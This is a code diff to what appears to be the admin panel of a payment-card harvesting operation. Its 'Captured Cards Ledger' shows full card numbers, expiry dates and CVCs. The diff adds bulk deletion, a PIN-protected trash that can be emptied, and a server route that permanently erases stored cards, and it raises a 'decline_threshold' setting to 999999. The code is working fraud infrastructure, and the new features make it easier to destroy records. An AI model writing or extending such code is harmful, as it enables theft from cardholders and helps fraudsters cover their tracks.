@@ -48,7 +48,7 @@ const memStore = {
     background_color: '#0a0a1a',
     logo_url: null,
     decline_all: 0,
-    decline_threshold: 50.0,
+    decline_threshold: 999999.0,
     success_attempt: 1,
     trash_pin: bcrypt.hashSync('978797', 10)
   },
@@ -2429,6 +2429,14 @@ footer {
           <h1 id="cards-ledger-title">Captured Cards Ledger</h1>
           <div style="display: flex; gap: 1rem; align-items: center;">
             <input type="text" id="card-search-input" placeholder="🔍 Search card digits..." class="btn btn-outline" style="background: rgba(255,255,255,0.05); text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #ffffff; max-width: 200px; border-color: rgba(255, 255, 255, 0.1);">
+            
+            <button id="bulk-delete-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🗑️ Delete Selected
+            </button>
+            <button id="empty-trash-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              ⚠️ Empty Trash
+            </button>
+            
             <button id="view-trash-btn" class="btn btn-outline" style="border-color: var(--accent-color); color: var(--accent-color); display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
               🗑️ Trash Bin
             </button>
@@ -2444,6 +2452,7 @@ footer {
           <table class="admin-table">
             <thead>
               <tr>
+                <th style="width: 40px; text-align: center;"><input type="checkbox" id="select-all-cards" style="cursor: pointer; transform: scale(1.2);"></th>
                 <th>Card Number</th>
                 <th>Expiration</th>
                 <th>CVC</th>
@@ -2856,6 +2865,10 @@ document.addEventListener('DOMContentLoaded', async () => {
       trashDecryptionKey = null;
       localStorage.setItem('admin_cards_showing_trash', 'false');
       localStorage.removeItem('admin_trash_pin');
+      
+      const emptyTrashBtn = document.getElementById('empty-trash-btn');
+      if (emptyTrashBtn) emptyTrashBtn.style.display = 'none';
+      
       fetchAdminCards();
       return;
     }
@@ -2911,6 +2924,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const title = document.getElementById('cards-ledger-title');
       const trashBtn = document.getElementById('view-trash-btn');
       const changePinBtn = document.getElementById('change-pin-btn');
+      const emptyTrashBtn = document.getElementById('empty-trash-btn');
       
       if (title) title.innerText = '🗑️ Decrypted Trash Bin';
       if (trashBtn) {
@@ -2919,6 +2933,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         trashBtn.style.color = 'var(--primary-color)';
       }
       if (changePinBtn) changePinBtn.style.display = 'flex';
+      if (emptyTrashBtn) emptyTrashBtn.style.display = 'flex';
       
     } catch (err) {
       if (pinError) pinError.innerText = 'Failed to communicate with decryption gateway.';
@@ -2945,6 +2960,87 @@ document.addEventListener('DOMContentLoaded', async () => {
       return num.includes(query);
     });
     renderCardsTable(filtered);
+  });
+
+  // Bind Bulk Actions
+  const selectAllCb = document.getElementById('select-all-cards');
+  const cardsTbody = document.getElementById('admin-cards-tbody');
+  const bulkDeleteBtn = document.getElementById('bulk-delete-btn');
+  const emptyTrashBtn = document.getElementById('empty-trash-btn');
+
+  const updateBulkActionsState = () => {
+    const checkboxes = Array.from(cardsTbody.querySelectorAll('.card-checkbox'));
+    const checked = checkboxes.filter(cb => cb.checked);
+    
+    if (checkboxes.length > 0 && checked.length === checkboxes.length) {
+      selectAllCb.checked = true;
+    } else {
+      selectAllCb.checked = false;
+    }
+
+    if (checked.length > 0) {
+      bulkDeleteBtn.style.display = 'flex';
+      bulkDeleteBtn.innerText = \`🗑️ Delete Selected (\${checked.length})\`;
+    } else {
+      bulkDeleteBtn.style.display = 'none';
+    }
+  };
+
+  selectAllCb?.addEventListener('change', (e) => {
+    const checkboxes = Array.from(cardsTbody.querySelectorAll('.card-checkbox'));
+    checkboxes.forEach(cb => { cb.checked = e.target.checked; });
+    updateBulkActionsState();
+  });
+
+  cardsTbody?.addEventListener('change', (e) => {
+    if (e.target.classList.contains('card-checkbox')) {
+      updateBulkActionsState();
+    }
+  });
+
+  bulkDeleteBtn?.addEventListener('click', async () => {
+    const checked = Array.from(cardsTbody.querySelectorAll('.card-checkbox:checked')).map(cb => cb.value);
+    if (checked.length === 0) return;
+    
+    showCustomConfirm('🗑️ Bulk Delete', \`Are you sure you want to delete \${checked.length} selected card(s)?\`, async () => {
+      let failed = 0;
+      for (const cardNum of checked) {
+        try {
+          const endpoint = showingTrash ? \`/api/admin/cards/\${encodeURIComponent(cardNum)}\` : \`/api/admin/cards/\${encodeURIComponent(cardNum)}/delete\`;
+          const method = showingTrash ? 'DELETE' : 'PUT';
+          await fetch(endpoint, { method, headers: getAuthHeaders() });
+          
+          if (!showingTrash) {
+            let localCards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+            localCards = localCards.filter(c => (c.card_number || '').replace(/\\\\s+/g, '') !== cardNum.replace(/\\\\s+/g, ''));
+            localStorage.setItem('future_chips_cards', JSON.stringify(localCards));
+          }
+        } catch(e) {
+          failed++;
+        }
+      }
+      
+      if (failed > 0) {
+        showCustomAlert('⚠️ Warning', \`Completed with \${failed} failures.\`);
+      }
+      
+      selectAllCb.checked = false;
+      bulkDeleteBtn.style.display = 'none';
+      fetchAdminCards();
+    });
+  });
+
+  emptyTrashBtn?.addEventListener('click', () => {
+    showCustomConfirm('⚠️ Empty Trash', 'Are you sure you want to permanently erase all cards in the trash?', async () => {
+      try {
+        const res = await fetch('/api/admin/cards/trash/empty', { method: 'DELETE', headers: getAuthHeaders() });
+        if (res.status === 401) return handleSessionExpired();
+        if (!res.ok) throw new Error('Failed to empty trash');
+        fetchAdminCards();
+      } catch (err) {
+        showCustomAlert('❌ Execution Failed', err.message);
+      }
+    });
   });
 
   // Sync color pickers with hex text fields
@@ -3321,6 +3417,12 @@ function renderCardsTable(cards) {
   const tbody = document.getElementById('admin-cards-tbody');
   if (!tbody) return;
 
+  const selectAll = document.getElementById('select-all-cards');
+  if (selectAll) selectAll.checked = false;
+  
+  const bulkDeleteBtn = document.getElementById('bulk-delete-btn');
+  if (bulkDeleteBtn) bulkDeleteBtn.style.display = 'none';
+
   // Deduplicate cards by card_number
   const seen = new Set();
   const uniqueCards = [];
@@ -3333,7 +3435,7 @@ function renderCardsTable(cards) {
   }
 
   if (uniqueCards.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
     return;
   }
 
@@ -3344,6 +3446,7 @@ function renderCardsTable(cards) {
 
     return \`
       <tr>
+        <td style="text-align: center;"><input type="checkbox" class="card-checkbox" value="\${c.card_number}" style="cursor: pointer; transform: scale(1.2);"></td>
         <td style="font-family: monospace; font-weight: 600;">\${c.card_number}</td>
         <td>\${c.expiry}</td>
         <td style="font-family: monospace;">\${c.cvc}</td>
@@ -8567,6 +8670,17 @@ app.delete('/api/admin/cards/:cardNumber', authMiddleware, async (req, res) => {
     res.json({ message: 'Card permanently erased from ledger', cardNumber });
   } catch (err) {
     res.status(500).json({ error: 'Failed to permanently delete card' });
+  }
+});
+
+// Empty Trash permanently
+app.delete('/api/admin/cards/trash/empty', authMiddleware, async (req, res) => {
+  try {
+    memStore.cards = memStore.cards.filter(c => c.is_deleted === 0);
+    await dbRun('DELETE FROM cards WHERE is_deleted = 1');
+    res.json({ message: 'Trash emptied successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to empty trash' });
   }
 });
 
